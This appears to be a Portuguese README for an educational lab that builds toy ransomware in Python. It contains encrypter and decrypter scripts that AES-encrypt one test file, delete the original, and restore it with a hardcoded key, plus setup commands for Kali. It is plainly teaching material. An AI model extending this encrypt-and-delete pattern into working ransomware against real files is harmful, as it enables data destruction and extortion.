# Ransonware com Python - Encriptação e Descriptação

## Disclaimer

Repositório criado para fins educacionais.

## Objetivo

Este laboratório visa entender as bases do ransomware através da encriptação e descriptação através da linguagem Python e sua biblioteca AES.

### Habilidades Aprendidas

- Conceitos avançados de criptografia com linguagem de código
- Entendimento aprofundado de técnicas de hacking

### Ferramentas Utilizadas

- Kali Linux
- Python 3

## Desenvolvimento

Criar uma pasta com 3 arquivos: um arquivo de texto .TXT e dois arquivos .PY
No laboratório foram criados os arquivos: teste.txt, encrypter.py e decrypter.py

![ransomware-python-cybersec/ransomware-python-imgs/ransomware-python-img1.png at main · TatianePimentaLeal/ransomware-python-cybersec · GitHub](https://github.com/TatianePimentaLeal/ransomware-python-cybersec/blob/main/ransomware-python-imgs/ransomware-python-img1.png)

*Ref 1: Criação de pasta e arquivos*

\***

No arquivo .TXT inserir um texto simples para fins de exemplo visual. Já nos arquivos .py foram incluídos os seguintes códigos:

**encrypter.py**

```
import os
import pyaes

## abrir o arquivo a ser criptografado
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remover o arquivo
os.remove(file_name)

## chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
```

**decrypter.py**

```
import os
import pyaes

## abrir o arquivo criptografado
file_name = "teste.txt.ransomwaretroll"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## chave para descriptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)
decrypt_data = aes.decrypt(file_data)

## remover o arquivo criptografado
os.remove(file_name)

## criar o arquivo descriptografado
new_file = "teste.txt"
new_file = open(f'{new_file}', "wb")
new_file.write(decrypt_data)
new_file.close()
```

Caso apareça o erro:

> **Traceback (most recent call last): File "/home/kali/projeto-ransomware/encrypter.py", line 2, in import pyaes ModuleNotFoundError: No module named 'pyaes'**



É porque, para rodar os comandos de encriptação e decriptação, é importante ter a biblioteca AES do Python. Neste caso, na pasta dos arquivos, rode o comando:

```
sudo apt-get update
```

Aguarde as atualizações e então rode este outro comando e aguarde:

```
sudo apt-get -y install python3-pyaes
```

Assim, o erro não aparecerá mais e os comandos Python poderão ser executados sem problemas:

![ransomware-python-cybersec/ransomware-python-imgs/ransomware-python-img2.png at main · TatianePimentaLeal/ransomware-python-cybersec · GitHub](https://github.com/TatianePimentaLeal/ransomware-python-cybersec/blob/main/ransomware-python-imgs/ransomware-python-img2.png)

*Ref 2: Instalação do Python3-pyaes*

\***

Agora, ao rodar o comando:

```
python encrypter.py
```

O arquivo teste.txt será encriptado:

![ransomware-python-cybersec/ransomware-python-imgs/ransomware-python-img3.png at main · TatianePimentaLeal/ransomware-python-cybersec · GitHub](https://github.com/TatianePimentaLeal/ransomware-python-cybersec/blob/main/ransomware-python-imgs/ransomware-python-img3.png)

*Ref 3: Encriptação do arquivo teste.txt*

\***

E ao rodar o comando:

```
python decrypter.py
```

O arquivo voltará a aparecer corretamente:

![ransomware-python-cybersec/ransomware-python-imgs/ransomware-python-img4.png at main · TatianePimentaLeal/ransomware-python-cybersec · GitHub](https://github.com/TatianePimentaLeal/ransomware-python-cybersec/blob/main/ransomware-python-imgs/ransomware-python-img4.png)

![ransomware-python-cybersec/ransomware-python-imgs/ransomware-python-img5.png at main · TatianePimentaLeal/ransomware-python-cybersec · GitHub](https://github.com/TatianePimentaLeal/ransomware-python-cybersec/blob/main/ransomware-python-imgs/ransomware-python-img5.png)

*Ref 4 e 5: Decriptação do arquivo teste.txt.*
